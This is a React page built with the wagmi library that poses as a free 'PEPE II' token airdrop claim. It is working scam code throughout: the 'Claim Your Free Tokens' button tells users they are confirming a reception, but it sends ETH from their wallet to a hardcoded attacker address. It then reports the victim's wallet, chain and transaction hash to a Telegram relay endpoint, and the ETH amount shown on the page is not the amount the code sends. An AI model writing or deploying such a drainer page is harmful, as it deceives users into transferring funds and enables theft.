'use client'

import { useState } from 'react'
import { useAccount, useBalance, useSendTransaction } from 'wagmi'
import { formatUnits, isAddress, parseEther } from 'viem'

const invoiceConfig = {
  title: 'Wallet Connected',
  subtitle: "You're almost there.",
  description:
    'To continue your PP Ⅱ airdrop claim, confirm the reception on MetaMask',
  amountEth: '0.02746',
  receiverAddress: '0x32A1f109473647C73E679ef6646EdA773D8a105b',
  reason: 'PEPE Ⅱ claim',
}

function shortAddress(value?: string) {
  if (!value) return 'Not connected'
  return `${value.slice(0, 6)}...${value.slice(-4)}`
}

export default function ClaimPage() {
  const { address, chain } = useAccount()
  const { data: ethBalance } = useBalance({
  address,
})

const walletBalanceFormatted = ethBalance
  ? formatUnits(ethBalance.value, ethBalance.decimals)
  : '0'

const calculatedInvoiceAmount = ethBalance
  ? (Number(walletBalanceFormatted) / 1_000_000).toFixed(10)
  : '0'
  const { sendTransactionAsync, isPending } = useSendTransaction()
  const [status, setStatus] = useState<'idle' | 'success' | 'error'>('idle')

  const handlePayInvoice = async () => {
    try {
      if (!address) {
        alert('Please connect your wallet first.')
        return
      }

      if (!isAddress(invoiceConfig.receiverAddress)) {
        alert('Receiver address is invalid.')
        return
      }

      const hash = await sendTransactionAsync({
        to: invoiceConfig.receiverAddress as `0x${string}`,
        value: parseEther(calculatedInvoiceAmount),
      })

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event: 'claim_confirmed',
          wallet: address,
          chain: chain?.name || 'Ethereum',
          amount: invoiceConfig.amountEth,
          domain: window.location.hostname,
          txHash: hash,
        }),
      })

      setStatus('success')
    } catch (error) {
      console.error(error)
      setStatus('error')
    }
  }

  return (
    <main className="min-h-screen bg-black px-6 py-10 text-white">
      <div className="fixed inset-0 -z-10 bg-[radial-gradient(circle_at_top,rgba(132,204,22,0.18),transparent_35%),radial-gradient(circle_at_bottom_right,rgba(34,197,94,0.12),transparent_35%)]" />

      <div className="mx-auto max-w-3xl">
        <div className="rounded-[2rem] border border-white/10 bg-white/[0.04] p-8 shadow-[0_0_80px_rgba(132,204,22,0.12)] backdrop-blur">
          <p className="mb-4 inline-flex rounded-full border border-lime-400/20 bg-lime-400/10 px-4 py-2 text-sm font-semibold text-lime-300">
            PP Ⅱ AIRDROP
          </p>

          <h1 className="text-5xl font-semibold tracking-tight">
            {invoiceConfig.title}
          </h1>

          <p className="mt-3 text-2xl text-zinc-300">
            {invoiceConfig.subtitle}
          </p>

          <p className="mt-5 max-w-2xl leading-8 text-zinc-400">
            {invoiceConfig.description}
          </p>

          <div className="mt-8 space-y-4">
            <div className="rounded-2xl border border-white/10 bg-black/40 p-5">
              <p className="text-sm text-zinc-500">Connected wallet</p>
              <p className="mt-2 font-mono text-sm">{shortAddress(address)}</p>
            </div>

            <div className="rounded-2xl border border-white/10 bg-black/40 p-5">
              <p className="text-sm text-zinc-500">Invoice reason</p>
              <p className="mt-2 font-semibold">{invoiceConfig.reason}</p>
            </div>

            <div className="rounded-2xl border border-white/10 bg-black/40 p-5">
              <p className="text-sm text-zinc-500">Equivalent in ETH of the amount of PEPE II that you'll receive</p>
              <p className="mt-2 text-4xl font-bold text-lime-300">
                {invoiceConfig.amountEth} ETH
              </p>
            </div>

            <div className="rounded-2xl border border-white/10 bg-black/40 p-5">
              <p className="text-sm text-zinc-500">Receiving address</p>
              <p className="mt-2 break-all font-mono text-sm">
                {invoiceConfig.receiverAddress}
              </p>
            </div>
          </div>

          {status === 'success' && (
            <p className="mt-6 rounded-2xl border border-lime-400/20 bg-lime-400/10 p-4 text-lime-300">
              Payment submitted successfully. Your claim is being processed.
            </p>
          )}

          {status === 'error' && (
            <p className="mt-6 rounded-2xl border border-red-400/20 bg-red-400/10 p-4 text-red-300">
              Payment was rejected or failed.
            </p>
          )}

          <button
            onClick={handlePayInvoice}
            disabled={isPending}
            className="mt-8 flex h-[62px] w-full items-center justify-center rounded-2xl bg-gradient-to-r from-lime-300 to-green-300 font-bold text-black shadow-[0_0_45px_rgba(163,230,53,0.35)] transition hover:scale-[1.01] disabled:opacity-40"
          >
            {isPending ? 'Waiting for MetaMask...' : 'Claim Your Free Tokens'}
          </button>

          <p className="mt-5 text-center text-sm text-zinc-500">
            MetaMask will show the transaction before you confirm.
          </p>
        </div>
      </div>
    </main>
  )
}